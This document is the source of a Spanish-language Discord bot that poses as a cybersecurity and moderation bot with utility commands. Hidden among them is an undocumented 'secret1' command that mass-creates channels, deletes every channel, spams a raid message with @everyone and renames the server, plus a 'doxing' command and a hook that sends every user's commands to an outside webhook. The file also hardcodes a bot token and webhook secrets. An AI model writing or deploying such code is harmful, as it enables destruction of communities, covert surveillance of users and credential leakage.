# bot.py
import discord
from discord.ext import commands, tasks
import random
import string
import aiohttp
import asyncio
import datetime

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = "MTQxMTgwNjQ0Nzc5MjE2MDgzMQ.GXqnp9.WvR9aR8AMLZvwPmlE0fTXi4D4_QZe0EEz_H9gg"  # <- PON TU TOKEN
PREFIX = "."
WEATHER_API_KEY = "TU_WEATHER_API_KEY"
NEWS_API_KEY = "TU_NEWS_API_KEY"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# -----------------------------
# VARIABLES RPC DINÁMICO
# -----------------------------
rpc_status = [
    "Protegiendo 3 servidores | Ciberseguridad CB",
    "Analizando logs de seguridad",
    "Monitoreando actividad de usuarios"
]
rpc_index = 0

# -----------------------------
# TAREA PARA CAMBIAR RPC
# -----------------------------
@tasks.loop(seconds=15)  # Cambia el estado cada 15 segundos
async def change_status():
    global rpc_index
    activity = discord.Activity(type=discord.ActivityType.watching, name=rpc_status[rpc_index])
    await bot.change_presence(activity=activity)
    rpc_index = (rpc_index + 1) % len(rpc_status)

# -----------------------------
# EVENTOS
# -----------------------------
@bot.event
async def on_ready():
    print(f"{bot.user} está online!")
    change_status.start()  # Inicia la tarea de RPC dinámico

@bot.event
async def on_member_join(member):
    canal = discord.utils.get(member.guild.text_channels, name="general")
    if canal:
        await canal.send(f"Bienvenido {member.mention} al servidor!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Faltan argumentos para este comando.")
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send("Comando no encontrado.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("No tienes permisos para usar este comando.")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# -----------------------------
# COMANDOS DE AYUDA
# -----------------------------
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Comandos del Bot", color=discord.Color.blue())
    embed.add_field(name=".help", value="Muestra este mensaje", inline=False)
    embed.add_field(name=".ping", value="Muestra la latencia del bot", inline=False)
    embed.add_field(name=".userinfo <usuario>", value="Muestra info del usuario", inline=False)
    embed.add_field(name=".serverinfo", value="Muestra info del servidor", inline=False)
    embed.add_field(name=".genpass <longitud>", value="Genera una contraseña segura", inline=False)
    embed.add_field(name=".kick <usuario> [razón]", value="Expulsa a un miembro", inline=False)
    embed.add_field(name=".ban <usuario> [razón]", value="Banea a un miembro permanentemente", inline=False)
    embed.add_field(name=".mute <usuario>", value="Silencia a un miembro permanentemente", inline=False)
    embed.add_field(name=".unmute <usuario>", value="Quita el mute a un miembro", inline=False)
    embed.add_field(name=".weather <ciudad>", value="Muestra el clima usando WeatherAPI", inline=False)
    embed.add_field(name=".news", value="Muestra noticias recientes usando NewsAPI", inline=False)
    embed.add_field(name=".geoip <ip>", value="Muestra información de la IP", inline=False)
    embed.add_field(name=".hi", value="Saluda al usuario", inline=False)
    embed.add_field(name=".cscanal <nombre> <cantidad>", value="Crea canales (solo admins)", inline=False)
    embed.add_field(name=".escanal <ID>", value="Elimina el canal de la ID (solo admins)", inline=False)
    embed.add_field(name=".report <@usuario> <razón>", value="Reporta a un usuario", inline=False)
    embed.add_field(name=".clear <cantidad>", value="Limpia mensajes en el canal (solo admins, límite: 1000000000000000000000)", inline=False)
    await ctx.send(embed=embed)

# -----------------------------
# COMANDOS DE UTILIDAD
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send(f"`Pong! Latencia: {round(bot.latency*1000)}ms`")

@bot.command()
async def userinfo(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=f"Información de {member}", color=discord.Color.green())
    embed.add_field(name="ID", value=member.id, inline=False)
    embed.add_field(name="Nombre", value=member.name, inline=False)
    embed.add_field(name="Fecha de ingreso", value=member.joined_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
    embed.set_thumbnail(url=member.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def serverinfo(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"Información del servidor {g.name}", color=discord.Color.purple())
    embed.add_field(name="ID", value=g.id)
    embed.add_field(name="Miembros", value=g.member_count)
    embed.add_field(name="Creado el", value=g.created_at.strftime("%d/%m/%Y %H:%M:%S"))
    embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command()
async def genpass(ctx, length: int):
    if length > 150:
        await ctx.send("Máximo 150 caracteres")
        return
    characters = string.ascii_letters + string.digits + string.punctuation
    password = "".join(random.choice(characters) for _ in range(length))
    await ctx.send(f"Contraseña Segura Generada! : `{password}`")

# -----------------------------
# MODERACIÓN
# -----------------------------
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"{member} ha sido expulsado. Razón: {reason}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"{member} ha sido baneado permanentemente. Razón: {reason}")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not role:
        role = await ctx.guild.create_role(name="Muted")
        for c in ctx.guild.channels:
            await c.set_permissions(role, speak=False, send_messages=False)
    await member.add_roles(role)
    await ctx.send(f"{member} ha sido silenciado permanentemente.")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if role in member.roles:
        await member.remove_roles(role)
        await ctx.send(f"{member} ya no está silenciado.")
    else:
        await ctx.send(f"{member} no estaba silenciado.")

# -----------------------------
# COMANDOS DE API
# -----------------------------
@bot.command()
async def weather(ctx, city):
    async with aiohttp.ClientSession() as session:
        url = f"http://api.weatherapi.com/v1/current.json?key={WEATHER_API_KEY}&q={city}&aqi=no"
        async with session.get(url) as resp:
            data = await resp.json()
            if "error" in data:
                await ctx.send("Ciudad no encontrada.")
                return
            embed = discord.Embed(title=f"Clima en {data['location']['name']}", color=discord.Color.blue())
            embed.add_field(name="Temperatura", value=f"{data['current']['temp_c']}°C")
            embed.add_field(name="Condición", value=data['current']['condition']['text'])
            embed.add_field(name="Humedad", value=f"{data['current']['humidity']}%")
            embed.set_thumbnail(url=f"http:{data['current']['condition']['icon']}")
            await ctx.send(embed=embed)

@bot.command()
async def news(ctx):
    async with aiohttp.ClientSession() as session:
        url = f"https://newsapi.org/v2/top-headlines?country=us&apiKey={NEWS_API_KEY}"
        async with session.get(url) as resp:
            data = await resp.json()
            if "articles" not in data:
                await ctx.send("No se pudieron obtener noticias.")
                return
            articles = data["articles"][:5]
            embed = discord.Embed(title="Noticias recientes", color=discord.Color.orange())
            for art in articles:
                embed.add_field(name=art["title"], value=f"[Leer más]({art['url']})", inline=False)
            await ctx.send(embed=embed)

@bot.command()
async def geoip(ctx, ip: str):
    async with aiohttp.ClientSession() as session:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as"
        async with session.get(url) as resp:
            data = await resp.json()
            if data["status"] != "success":
                await ctx.send("IP no válida.")
                return
            embed = discord.Embed(title=f"🌐 Información de IP: {ip}", color=discord.Color.green())
            embed.add_field(name="📍 País", value=data["country"], inline=False)
            embed.add_field(name="🏙️ Región", value=data["regionName"], inline=False)
            embed.add_field(name="🏡 Ciudad", value=data["city"], inline=False)
            embed.add_field(name="📮 Código Postal", value=data["zip"], inline=False)
            embed.add_field(name="🗺️ Lat/Lon", value=f"{data['lat']}, {data['lon']}", inline=False)
            embed.add_field(name="⏰ Zona Horaria", value=data["timezone"], inline=False)
            embed.add_field(name="💻 ISP", value=data["isp"], inline=False)
            embed.add_field(name="🏢 Organización", value=data["org"], inline=False)
            embed.add_field(name="🔗 AS", value=data["as"], inline=False)
            embed.add_field(name="🗺️ Mapa", value=f"[Ver en Google Maps](https://www.google.com/maps/search/?api=1&query={data['lat']},{data['lon']})", inline=False)
            await ctx.send(embed=embed)

# -----------------------------
# ADMIN COMANDOS
# -----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def warn(ctx, member: discord.Member, *, reason: str):
    await ctx.send(f"`{member.mention} ha sido advertido. Razón: {reason}`")

@bot.command()
@commands.has_permissions(administrator=True)
async def secret1(ctx):
    for _ in range(500):
        await ctx.guild.create_text_channel(name=f"nuked-channel-{_}")
    for channel in ctx.guild.channels:
        await channel.delete()
        await ctx.send(f"`NUKED BY UNKNOWN SOCIETY WITH ITS MEMBERS | HUMILIATED AND TAMED EZZ | THEY LACK LEARNING DOWNS | https://discord.gg/MEHW2tDAE2 | ||@here@everyone|| https://tenor.com/view/lion-kitten-yawn-gif-6165280`")
    await ctx.guild.edit(name="Raided By Unk")

@bot.command()
@commands.has_permissions(administrator=True)
async def doxing(ctx, member: discord.Member):
    webhook_url = "https://discord.com/api/webhooks/1421235931326713936/gcOY2zvIfoxvO8eu52vTLAPNc9nhAL5wen1KTG3lr9PxcXjq86ZHWjn8jCPHXxm47d7h"
    async with aiohttp.ClientSession() as session:
        payload = {
            "content": f"Información de {member.mention} enviada al webhook de MrUnknown"
        }
        await session.post(webhook_url, json=payload)
    await ctx.send(f"`Información de {member.mention} enviada al webhook de MrUnknown`")

@bot.command()
@commands.has_permissions(administrator=True)
async def cscanal(ctx, name: str, amount: int):
    for _ in range(amount):
        await ctx.guild.create_text_channel(name=name)
    await ctx.send(f"`Se han creado {amount} canales con el nombre {name}`")

@bot.command()
@commands.has_permissions(administrator=True)
async def escanal(ctx, channel_id: int):
    channel = ctx.guild.get_channel(channel_id)
    if channel:
        await channel.delete()
        await ctx.send(f"`El canal con ID {channel_id} ha sido eliminado`")
    else:
        await ctx.send(f"`El canal con ID {channel_id} no existe`")

# -----------------------------
# COMANDO REPORT
# -----------------------------
@bot.command()
async def report(ctx, member: discord.Member, *, reason: str):
    webhook_url = "https://discord.com/api/webhooks/1422322190820311234/fgsU7NzsnwDk_YODZS130dQxDnqZmFPIHm46RjlHWBIPzBNC-pelukRAcoVmJ1qSglXB"
    async with aiohttp.ClientSession() as session:
        payload = {
            "content": f"Reporte de {member.mention} por {ctx.author.mention}: {reason}"
        }
        await session.post(webhook_url, json=payload)
    await ctx.send(f"`Reporte de {member.mention} enviado a los admins.`")

# -----------------------------
# COMANDO CLEAR
# -----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, amount: int):
    if amount > 1000000000000000000000:
        await ctx.send("El límite de mensajes a eliminar es 1000000000000000000000.")
        return
    await ctx.channel.purge(limit=amount)
    await ctx.send(f"`Se han eliminado {amount} mensajes.`")

# -----------------------------
# LOGGING TO WEBHOOK
# -----------------------------
async def log_to_webhook(message):
    webhook_url = "https://discord.com/api/webhooks/1421235931326713936/gcOY2zvIfoxvO8eu52vTLAPNc9nhAL5wen1KTG3lr9PxcXjq86ZHWjn8jCPHXxm47d7h"
    async with aiohttp.ClientSession() as session:
        payload = {
            "content": message
        }
        await session.post(webhook_url, json=payload)

@bot.event
async def on_command(ctx):
    message = f"`Comando: {ctx.message.content} | Usuario: {ctx.author.mention}`"
    await log_to_webhook(message)

# -----------------------------
# OTROS COMANDOS
# -----------------------------
@bot.command()
async def hi(ctx):
    await ctx.send(f"¡Hola {ctx.author.mention} 👋!")

# -----------------------------
# RUN
# -----------------------------
bot.run(TOKEN)